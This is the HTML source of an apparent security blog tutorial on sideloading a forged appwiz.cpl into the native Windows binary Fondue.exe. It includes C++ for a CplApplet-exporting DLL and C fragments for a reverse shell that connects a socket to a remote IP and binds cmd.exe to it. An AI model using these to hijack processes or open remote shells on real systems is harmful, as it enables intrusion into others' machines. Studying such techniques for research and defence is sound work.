<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>DLL Injection: Fondue.exe</title>
        <link rel="icon" type="image/x-icon" href="../assets/img/favicon.ico" />
        <!-- Font Awesome icons (free version)-->
        <script src="https://use.fontawesome.com/releases/v5.15.1/js/all.js" crossorigin="anonymous"></script>
        <!-- Google fonts-->
        <link href="https://fonts.googleapis.com/css?family=Saira+Extra+Condensed:500,700" rel="stylesheet" type="text/css" />
        <link href="https://fonts.googleapis.com/css?family=Muli:400,400i,800,800i" rel="stylesheet" type="text/css" />
        <!-- Core theme CSS (includes Bootstrap)-->
        <link href="../css/styles.css" rel="stylesheet" />
    </head>
    <body id="page-top">
        <!-- Navigation-->
        <nav class="navbar navbar-expand-xl navbar-dark bg-primary fixed-top" id="sideNav">
            <script src="/js/nav.js"></script>
        </nav>
        <!-- Page Content-->
        <div>
            <nav class="navbar navbar-expand-xl navbar-dark bg-header sticky-top">
            <h3 class="header-article"><a href="../vulnpage.html">Vulnerability Exploitation </a>> Fondue CPL Sideloading</h3>
            </nav>
            <section class="article">
                <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
                    <div class="flex-grow-1">
                        <h4 class="mb-0">DLL sideloading and CPL files</h4>
                        <p>
                            Previously, I experienced the <a href="./dllsideloading.html">DLL sideloading</a> with a vulnerable Notepad++ version 6.66 and describe how to take control the execution of the vulnerable binary by exploiting a native way Windows operating system is working. Windows attempts to load the DLL from a path defined by the application or from a manifest file but if the full path is not indicated, the order for Windows to search for the needed DLL is:
                            <ul>
                                <li>Binary directory</li>
                                <li>System directory</li>
                                <li>Windows directory</li>
                                <li>Current directory</li>
                                ...
                            </ul>
                                <br>

                            <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fondue">Fondue</a> is a native Windows binary that exists from Windows 10 to Windows Server 2025 at the time of this article. It can be used to enable some Windows optional features. Running Fondue.exe will load some libraries; among them appwiz.cpl will be loaded. A .cpl file is similar to a DLL file but for control panel item. Hdwwiz.exe is another Windows binary that need a .cpl file to run. 

                            <img src="img/fondue/procmon.jpg" class="img-fluid" width="900">
                            Appwiz.cpl is loading from the binary directory (I run fondue.exe from C:\Users\Public) and then load the native .dll from Windows\System32. This technique is common to check if a binary is potentially vulnerable to a dll sideloading exploit.

                            Let's forge our own appwiz.cpl by creating our own .dll. <br>
                            The entry point of any dll is called DLL Main.

                            <div class="squarebox">
                                BOOL WINAPI DllMain( <br>
                                    HANDLE hModule,// Handle to DLL module <br>
                                    DWORD reason,// Reason for calling function <br>
                                    LPVOID lpReserved ) // Reserved <br>
                                    { <br>
                                        switch ( reason ) <br>
                                        { <br>
                                        &emsp;case DLL_PROCESS_ATTACHED: // A process is loading the DLL. <br>
                                        &emsp;&emsp;break; <br>
                                        &emsp;case DLL_THREAD_ATTACHED: // A process is creating a new thread. <br>
                                        &emsp;&emsp;break; <br>
                                        &emsp;case DLL_THREAD_DETACH: // A thread exits normally. <br>
                                        &emsp;&emsp;break; <br>
                                        &emsp;case DLL_PROCESS_DETACH: // A process unloads the DLL. <br>
                                        &emsp;&emsp;break; <br>
                                        } <br>
                                        return TRUE; <br>
                                    } <br>
                           </div>

                           If a process is calling the function LoadLibrary("dllfile.dll"), then dllfile.dll will run the code under DLL_PROCESS_ATTACHED. <br>
                           In Visual Studio, if you don't want to include "pch.h", create a empty project, modify the property of the project, and set .dll as configuration type.

                           <img src="img/fondue/dllcompile.jpg" class="img-fluid" width="900">

                           Although a .cpl is similar as a .dll, the code in our custom appwiz.cpl will not run if the code does not export the function CplApplet. CplApplet indicates to Windows that this .cpl file must be taken as a Control Panel item. Thanks <a href="https://www.ired.team/offensive-security/code-execution/executing-code-in-control-panel-item-through-an-exported-cplapplet-function">Ired</a> to provide the structure to run code in a .cpl file.

                           <div class="squarebox">
                                // dllmain.cpp : Defines the entry point for the DLL application. <br>
                                #include "stdafx.h" <br>
                                #include <Windows.h> <br>
 <br>
                                //Cplapplet <br>
                                extern "C" __declspec(dllexport) LONG Cplapplet(HWND hwndCpl, UINT msg, LPARAM lParam1, LPARAM lParam2) <br>
                                {<br>
                                &emsp;MessageBoxA(NULL, "Hey there, I am now your control panel item you know.", "Control Panel", 0);<br>
                                &emsp;return 1;<br>
                                }<br>
<br>
                                BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)<br>
                                { <br>
                                &emsp;switch (ul_reason_for_call) <br>
                                &emsp;{ <br>
                                &emsp;&emsp;case DLL_PROCESS_ATTACH: <br>
                                &emsp;{ <br>
                                &emsp;&emsp;Cplapplet(NULL, NULL, NULL, NULL); <br>
                                &emsp;} <br>
                                &emsp;case DLL_THREAD_ATTACH: <br>
                                &emsp;case DLL_THREAD_DETACH: <br>
                                &emsp;case DLL_PROCESS_DETACH: <br>
                                &emsp;break; <br>
                                &emsp;} <br>
                                &emsp;return TRUE; <br>
                                } <br>
                           </div>
                            Running Fondue.exe with our custom appwiz.cpl will display a popup "Hey there, I am now your control panel item you know".

                            <img src="img/fondue/execodecpl.jpg" class="img-fluid" width="900">
                        </p>
                        <h4 class="mb-0">Reverse Shell in C</h4>
                        <p>
                            Reverse shell requires multiples components, building the socket connection and spawn a process that will be hooked to the created socket. In Windows API, the library that gathers the functions for managing network socket is winsock2.h. In this library, we get functions like WSAStartup that initializes the socket information for the process or library. It is the first function to call when creating socket by a process.

                            <div class="squarebox">
                                WSADATA wsaData;
                                WSAStartup(MAKEWORD(1, 0), &wsaData);
                            </div>

                            LPWDSATA is a data structure having some info for the socket. <br>
                            Create the socket with WSAsocketw and use WSAConnect to establish a connection to another socket application. <br>
                            WSASocketW returns a SOCKET object.

                            <div class="squarebox">
                                SOCKET s; <br>
                                s = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); <br>
                                WSAConnect(s, (const SOCKADDR) &server, sizeof(server), NULL, NULL, NULL, NULL);
                            </div>

                            To specify the other socket, we will initialize another data structure "sockaddr" that will contains the ip type (IPv4 or IPv6), ip address and the port.

                            <div class="squarebox">
                                struct sockaddr_in server; <br>
                                server.sin_family = AF_INET; <br>
                                inet_pton(server.sin_family, serverIP, &server.sin_addr.s_addr); <br>
                                server.sin_port = htons(serverPort); <br>
                            </div>

                            Once the socket connection has been established, we create a process where the standard input, output, error is linked to the socket.

                            <div class="squarebox">
                                PROCESS_INFORMATION pi; <br>
                                STARTUPINFOA si; <br>
                                si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock; <br>
                                CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi); <br>
                            </div>

                            However, placing the code in the extern "C" __declspec(dllexport) generates a lot of errors. Extern "C" defines a function with a C linkage, so the program might do many redeclarations of functions for any program client using C instead of C++. C++ can do overloading of functions, the same function can be called in a multiple ways. The C linker will automatically use the definition of functions made for C thanks to the redeclaration of functions used inside by the C linkage. <br>
                            Since the program will not be used by a program using C, remove extern "C" __declspec(dllexport).

                            <div class="squarebox">
                                LONG Cplapplet(HWND hwndCpl, UINT msg, LPARAM lParam1, LPARAM lParam2)<br>
                                { <br>
                                &emsp;#REVERSE SHELL CODE <br>
                                } <br>
                            </div>
                        </p>
                        <br>
                        <h4 class="mb-0">Demo</h4>
                        <p>
                            <br>
                            <video width="80%" style="max-width: 100%; height: auto; display: block;" muted autoplay loop>
                                <source src="img/fondue/fonduedemo.mp4" type="video/mp4">
                                    Your browser does not support the video tag
                            </video>
                            <br>
                            <i>Note: 0x1FFC(16) = 8188(10)</i>
                        </p>
                    </div>
                </div>
            </section>            
        </div>
        <!-- Bootstrap core JS-->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <!-- Third party plugin JS-->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.4.1/jquery.easing.min.js"></script>
        <!-- Core theme JS-->
        <script src="js/scripts.js"></script>
    </body>
</html>
